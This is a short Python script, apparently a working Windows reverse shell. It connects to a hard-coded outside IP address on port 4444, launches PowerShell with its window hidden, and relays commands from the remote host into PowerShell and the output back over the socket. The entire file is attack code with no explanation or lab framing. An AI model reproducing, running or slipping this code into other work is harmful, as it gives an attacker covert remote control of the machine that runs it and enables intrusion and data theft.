import socket, subprocess, threading

def socket_to_process(s, p):
    while True:
        data = s.recv(1024)
        if not data:
            break
        p.stdin.write(data)
        p.stdin.flush()

def process_to_socket(s, p):
    while True:
        data = p.stdout.read(1)
        if not data:
            break
        s.send(data)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('34.163.206.43', 4444))

if s.fileno() != -1:
    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    p = subprocess.Popen(["powershell.exe"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, startupinfo=startupinfo)

    t1 = threading.Thread(target=socket_to_process, args=(s, p))
    t1.start()

    t2 = threading.Thread(target=process_to_socket, args=(s, p))
    t2.start()

    t1.join()
    t2.join()
else:
    print("Closed socket. Exiting...")